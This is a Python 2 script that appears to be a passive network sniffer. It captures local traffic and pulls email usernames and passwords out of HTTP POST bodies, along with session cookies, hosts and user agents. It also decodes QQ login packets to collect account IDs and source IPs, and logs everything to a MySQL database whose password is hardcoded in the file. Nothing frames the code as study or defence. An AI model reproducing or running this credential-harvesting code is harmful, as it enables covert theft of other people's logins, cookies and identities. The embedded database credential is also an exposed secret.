#coding=utf-8
__author__ = 'DM_'

import pcap
import dpkt
import binascii
import time
import sys
import MySQLdb
import threading
import re

#####################################
#Mysql Config String
DBHost = "192.168.1.200"
DBUser = "capture"
DBUserPasswd = "m3ptf4EFMfPCTsJV"
DBName = "capture"
DBCharset = "utf8"
#######################################

def TryPrintKeyValue(Arr, Key, PrefixStr="", SuffixStr=""):
    try:
        print PrefixStr + Arr[Key] + SuffixStr
    except KeyError:
        pass

def RtnKeyValueNotEmpty(Arr, *Keys):
    for key in Keys:
        try:
            Arr[key]
        except KeyError:
            Arr[key] = ""
    return Arr

def LogToTxtFile(LogCntDict, LogFilePath=None, *LogKeys):
    """
    :param LogCntArr:         日志记录字典或者字符串
    :param LogFilePath:       日志文件路径,默认为空,自动生成.
    :param LogKeys:           如果日志记录数据为字典格式,则记录指定key的值.
    """
    if not LogFilePath:
        CallFunName = sys._getframe().f_back.f_code.co_name
        CurrentDate = time.strftime('%Y-%m-%d', time.localtime(time.time()))
        CurrentTime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
        LogFilePath = "Logfile/" + CallFunName + "-" + CurrentDate + ".txt"

    LogCnt = "\n=========={0:s}============\n".format(time.ctime())
    if type(LogCntDict) == type(dict()):
        for key in LogKeys:
            try:
                LogCnt += "\n" + key + ":" + LogCntDict[key] + "\n"
            except KeyError:
                pass
    else:
        LogCnt = LogCntDict
    LogCnt += "\n\n"
    print "[!]LogCntLenth:", len(LogCnt)
    print "[+]Have been Logged!!!!!"
    LogFile = open(LogFilePath, "a")
    LogFile.write(LogCnt)
    LogFile.close()

def LogToDB(param, Type="HTTP"):
    global LogCursor
    Sql = ""
    if Type == "HTTP":
        Sql = "INSERT INTO http(time_in,srcip,host,url,postdata,email,username,passwd,cookie,useragent,referer) " \
              "VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s);"

    elif Type == "QQ":
        Sql = "INSERT INTO qq(time_in, srcip, qqid) " \
              "VALUES (%s,%s,%s);"
    LogCursor.execute(Sql, param)

def GetCurrentLoginQQ(LoggingEnable=True,
                      EchoEnable=True,
                      LogFilePath=None,
                      Filter="udp and (dst port 8000)"):    # portrange 4000-4050
    try:
        PcapHandler = pcap.pcap()
        PcapHandler.setfilter(Filter)
        QQIdLst = []

        for ts, buf in PcapHandler:
            eth = dpkt.ethernet.Ethernet(buf)
            srcip = '%d.%d.%d.%d' % tuple(map(ord,list(eth.data.src)))
            OICQFlag = int(binascii.hexlify(eth.data.data.data[0:1]), 16)
            OICQVer = int(binascii.hexlify(eth.data.data.data[1:3]), 16)
            OICQCommand = int(binascii.hexlify(eth.data.data.data[3:5]), 16)
            if OICQFlag == 2 and OICQVer == 0x341b:

                if OICQCommand == 0x0002:
                    QQId = int(binascii.hexlify(eth.data.data.data[7:11]), 16)

                    if not QQId in QQIdLst:
                        QQIdLst.append(QQId)

                        if EchoEnable:
                            print "==========={0:s}============".format(time.ctime())
                            print "[!]QQ:{0:d} login from {1:s}!!".format(QQId, srcip)
                            print
    #                        print "LoginFlag",binascii.hexlify(eth.data.data.data[1:6])
    #                        print "LoginFlag",OICQCommand
    #                        print "version",OICQVer
                        if LoggingEnable:
                            #time_in, srcip, qqid
                            CurrentTime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
                            param = (CurrentTime, srcip, QQId)
                            LogToDB(param, "QQ")
    except:
        print "[!]QQ analysis exited."

def AnalysisHTTPData(LoggingEnable=True,
                     EchoEnable=True,
                     LogFilePath=None,
                     Filter="tcp"):
    try:
        PcapHandler = pcap.pcap()
        PcapHandler.setfilter(Filter)
        for ts, buf in PcapHandler:
            eth = dpkt.ethernet.Ethernet(buf)
            srcip = '%d.%d.%d.%d' % tuple(map(ord,list(eth.data.src)))
            ip = eth.data
            tcp = ip.data
            if tcp.dport == 80 or 443 and len(tcp.data) > 0:
                # noinspection PyBroadException
                try:
                    http = dpkt.http.Request(tcp.data)
                    PostData = http.pack()
                    if len(http.headers):
                        r = re.findall("user=([\s\S]+?)&(domain=[\s\S]+?)?&password=([\s\S]+?)&",PostData)
                        if r:
                            EmailName = r[0][0]
                            Domain = r[0][1]
                            EmailPwd = r[0][2]
                            UserName = EmailName
                            if Domain:
                                EmailName += "@" + Domain[8:]
                        else:
                            EmailName = ""
                            EmailPwd = ""
                            UserName = ""
                        if EchoEnable:
                            print "[!]================{0:s}===============".format(time.ctime())
                            print "IP:{0:s}".format(srcip)
                            TryPrintKeyValue(http.headers, "user-agent", "User-agent:")
                            TryPrintKeyValue(http.headers, "host", "Host:")
                            TryPrintKeyValue(http.headers, "cookie", "Cookie:")
                            TryPrintKeyValue(http.headers, "referer", "Referer:")
                            print
                            print
                        if LoggingEnable:
                            headers = RtnKeyValueNotEmpty(http.headers, "user-agent", "host", "cookie", "referer")
                            CurrentTime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
                            #time_in,srcip,host,url,postdata,email,username,password,cookie,useragent,referer
                            param = (CurrentTime,
                                     srcip,
                                     headers["host"],
                                     http.uri,
                                     http.pack(),
                                     EmailName,
                                     UserName,
                                     EmailPwd,
                                     headers["cookie"],
                                     headers["user-agent"],
                                     headers["referer"])
                            LogToDB(param, "HTTP")
                        #Log(http.headers, LogFilePath, "user-agent", "host", "cookie", "referer")
                except:
                    pass
    except:
        print "[!]HTTP analysis exited!"

def AnalysisUDPData(LoggingEnable=True,
                    EchoEnable=True,
                    LogFilePath=None,
                    Filter="udp"):
    PcapHandler = pcap.pcap()
    PcapHandler.setfilter(Filter)
    for ts, buf in PcapHandler:
        print "==========={0:s}============".format(time.ctime())
        print dpkt.hexdump(buf)

if __name__ == '__main__':
    try:
        print "[!]TRY to connect to mysql Database."
        conn = MySQLdb.connect(host=DBHost, user=DBUser, passwd=DBUserPasswd, db=DBName, charset=DBCharset)
        LogCursor = conn.cursor()
        print "[+]connect successfully!"
        print "[!]Starting to capture."
        # noinspection PyListCreation
        WorkThreads = []
        WorkThreads.append(threading.Thread(target=AnalysisHTTPData, args=(True, True, None, "tcp")))
        WorkThreads.append(threading.Thread(target=GetCurrentLoginQQ,args=(True, True, None, "udp and (dst port 8000)")))
#       AnalysisHTTPData(True, False, None, "tcp")
#       GetCurrentLoginQQ(True, False, None, "udp and (dst port 8000)")
        for i in WorkThreads:
            i.start()
        for i in WorkThreads:
            i.join()
    except MySQLdb.OperationalError, e:
        print e[1]